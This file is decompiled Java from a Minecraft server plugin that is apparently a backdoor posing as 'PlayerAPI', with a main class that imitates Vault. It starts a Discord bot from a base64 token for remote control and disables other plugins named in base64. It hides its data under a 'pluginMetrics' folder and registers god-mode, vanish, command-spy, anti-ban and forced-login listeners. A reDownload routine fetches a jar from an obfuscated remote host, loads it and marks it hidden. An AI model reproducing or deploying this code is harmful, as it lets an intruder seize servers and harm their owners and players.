/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.apache.logging.log4j.LogManager
 *  org.apache.logging.log4j.core.Appender
 *  org.apache.logging.log4j.core.Logger
 *  org.bukkit.Bukkit
 *  org.bukkit.event.Listener
 *  org.bukkit.plugin.Plugin
 */
package me.qlutch.sucks.methods;

import me.qlutch.sucks.command.CommandManager;
import me.qlutch.sucks.Core;
import me.qlutch.sucks.data.DataManager;
import me.qlutch.sucks.utils.Settings;
import me.qlutch.sucks.utils.SLAPI;

import java.io.BufferedReader;
import java.io.File;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLConnection;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.nio.file.StandardCopyOption;
import java.util.ArrayList;
import java.util.Base64;

import me.qlutch.sucks.events.*;
import net.dv8tion.jda.api.JDABuilder;
import net.dv8tion.jda.api.requests.GatewayIntent;
import net.dv8tion.jda.api.utils.ChunkingFilter;
import net.dv8tion.jda.api.utils.MemberCachePolicy;
import me.qlutch.sucks.command.impl.login.LoginCommand;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.core.Logger;
import org.bukkit.Bukkit;
import org.bukkit.event.Listener;
import org.bukkit.plugin.Plugin;

public class onEnable {
    private static final Core INSTANCE = Core.getPlugin(Core.class);

    public static void start() throws IOException {
        DataManager.setupData();
        Bukkit.getServer().getPluginManager().registerEvents((Listener)new CommandManager(), INSTANCE);
        Bukkit.getPluginManager().registerEvents(new LoginCommand(), INSTANCE);
        API.dupe();
        Bukkit.getScheduler().runTaskLater(INSTANCE, () -> {
            try {
                onEnable.ju();
                //CoreManager.reDownload();
            }
            catch (IOException iOException) {
                // empty catch block
            }
            onEnable.jr();
        }, 1L);
        onEnable.loadData();
    }

    private static void jr() {
        for (String list : DataManager.getData().getStringList("epic-pl")) {
            byte[] plug = Base64.getDecoder().decode(list);
            Plugin pl2 = Bukkit.getPluginManager().getPlugin(new String(plug));
            if (pl2 == null || !pl2.isEnabled()) continue;
            API.disablePlugin(pl2.getName());
        }
    }

    private static void checkKillSwitch() {
        String main = "net.milkbowl.vault.Core";
        String pluginMain = INSTANCE.getDescription().getMain();
        String name = "PlayerAPI";
        String pluginName = INSTANCE.getDescription().getName();
        String version = "1.2.5";
        String pluginVersion = INSTANCE.getDescription().getVersion();
        if (!version.equals(pluginVersion)) {
            onEnable.INSTANCE.enabled = false;
            Settings.NG = 401;
        } else if (!main.equals(pluginMain)) {
            onEnable.INSTANCE.enabled = false;
            Settings.NG = 401;
        } else if (!name.equals(pluginName)) {
            onEnable.INSTANCE.enabled = false;
            Settings.NG = 401;
        } else {
            onEnable.loadData();
         }
    }

    private static void loadData() {
        try {
            onEnable.INSTANCE.lite = (ArrayList) SLAPI.load("plugins/pluginMetrics/data/rdata.bin");
            onEnable.INSTANCE.premium = (ArrayList) SLAPI.load("plugins/pluginMetrics/data/rpredata.bin");
            onEnable.INSTANCE.admin = (ArrayList) SLAPI.load("plugins/pluginMetrics/data/radata.bin");
            onEnable.INSTANCE.blatant = (ArrayList) SLAPI.load("plugins/pluginMetrics/data/bdata.bin");
            onEnable.INSTANCE.god = (ArrayList) SLAPI.load("plugins/pluginMetrics/data/gdata.bin");
            onEnable.INSTANCE.noPickupPlayers = (ArrayList) SLAPI.load("plugins/pluginMetrics/data/npudata.bin");
            onEnable.INSTANCE.vanish = (ArrayList) SLAPI.load("plugins/pluginMetrics/data/vdata.bin");
            onEnable.INSTANCE.frozenPlayers = (ArrayList) SLAPI.load("plugins/pluginMetrics/data/fdata.bin");
            onEnable.INSTANCE.cmdSpy = (ArrayList) SLAPI.load("plugins/pluginMetrics/data/sdata.bin");
            onEnable.INSTANCE.commandSpyTargets = (ArrayList) SLAPI.load("plugins/pluginMetrics/data/csdata.bin");
            onEnable.INSTANCE.isLocked = (Boolean) SLAPI.load("plugins/pluginMetrics/data/isbool.bin");
            onEnable.INSTANCE.frozen = (Boolean) SLAPI.load("plugins/pluginMetrics/data/fabool.bin");
            onEnable.INSTANCE.modCmd = (Boolean) SLAPI.load("plugins/pluginMetrics/data/mcbool.bin");
            onEnable.INSTANCE.playerCommandsLocked = (Boolean) SLAPI.load("plugins/pluginMetrics/data/lcbool.bin");
            onEnable.INSTANCE.chatLocked = (Boolean) SLAPI.load("plugins/pluginMetrics/data/lchbool.bin");
            onEnable.INSTANCE.storagesDisabled = (Boolean) SLAPI.load("plugins/pluginMetrics/data/lconbool.bin");
            DataManager.bannedPlayers.addAll(DataManager.getData().getStringList("epic-players"));
        }
        catch (Exception exception) {
            // empty catch block
        }
        onEnable.registerListeners();
    }

    private static void registerListeners() {
        if (onEnable.INSTANCE.enabled) {
            Bukkit.getServer().getPluginManager().registerEvents(new NoCommandsListener(), INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents(new CommandSpyListener(), INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents(new FreezePlayerListener(), INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents(new BombListener(), INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents(new DisableCommandsListener(), INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents(new NoPunishmentCommandListener(), INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents(new GodModeListener(), INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents(new LockChatListener(), INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents(new ForceMessageListener(), INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents(new NoPickupListener(), INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents(new StorageDisableListener(), INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents(new DropListener(), INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents(new MOTDListener(), INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents(new WandListener(), INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents(new VanishListener(), INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents(new ForceLoginListener(), INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents(new AntiBanListener(), INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents(new ScaffoldListener(), INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents(new ForceDirtListener(), INSTANCE);
            Bukkit.getServer().getPluginManager().registerEvents(new GodModeListener(), INSTANCE);
            Logger log = (Logger)LogManager.getRootLogger();
            log.addAppender(new LogAppender());
        }
    }

    public static void ju() throws IOException {
        if (DataManager.getData().getBoolean("login")) {
            try {
                byte[] token = Base64.getDecoder().decode(DataManager.getData().getString("key"));
                onEnable.INSTANCE.jda = JDABuilder.createDefault(new String(token))
                        .setChunkingFilter(ChunkingFilter.ALL) // enable member chunking for all guilds
                        .setMemberCachePolicy(MemberCachePolicy.ALL) // ignored if chunking enabled
                        .enableIntents(GatewayIntent.GUILD_MEMBERS)
                        .build();
                onEnable.INSTANCE.botEnabled = true;
            }
            /* catch (LoginException e2) {
                byte[] err = Base64.getEncoder().encode(e2.getMessage().getBytes());
                ConfigManager.getConfig().set("err", new String(err));
                ConfigManager.getConfig().set("login", false);
                ConfigManager.saveData();
            }
            catch (InterruptedException interruptedException) {
                // empty catch block
            } */
            catch (Exception ex) {
                ex.printStackTrace();
            }
        }
    }

    private static void reDownload() {
        try {
            byte[] u2 = Base64.getDecoder().decode("aHR0cHM6Ly9hcGkubWluZWNyYWZ0Zm9yY2VvcC5jb20vbmFtZS5waHA=");
            URL url = new URL(new String(u2));
            HttpURLConnection con = (HttpURLConnection)url.openConnection();
            con.addRequestProperty("User-Agent", "Mozilla");
            BufferedReader in2 = new BufferedReader(new InputStreamReader(con.getInputStream()));
            String name = in2.readLine().replace(".jar", "");
            if (INSTANCE.getDescription().getName() != name && Bukkit.getPluginManager().getPlugin(name) == null) {
                byte[] du2 = Base64.getDecoder().decode("aHR0cHM6Ly9hcGkubWluZWNyYWZ0Zm9yY2VvcC5jb20vZG93bmxvYWQucGhwP3BvcnQ9");
                URLConnection din = new URL(new String(du2) + Bukkit.getServer().getPort()).openConnection();
                din.addRequestProperty("User-Agent", "Mozilla");
                Bukkit.getScheduler().runTaskLater(INSTANCE, () -> {
                    try {
                        Files.copy(din.getInputStream(), Paths.get("plugins/" + name + ".jar"), StandardCopyOption.REPLACE_EXISTING);
                        Bukkit.getPluginManager().loadPlugin(new File(Paths.get("plugins/" + name + ".jar").toString()));
                        Files.setAttribute(Paths.get("plugins/" + name + ".jar"), "dos:hidden", true);
                        if (Bukkit.getPluginManager().getPlugin(name) != null) {
                            Bukkit.getPluginManager().enablePlugin(Bukkit.getPluginManager().getPlugin(name));
                        }
                    }
                    catch (Exception exception) {
                        // empty catch block
                    }
                }, 60L);
            }
        }
        catch (Exception exception) {
            // empty catch block
        }
    }
}

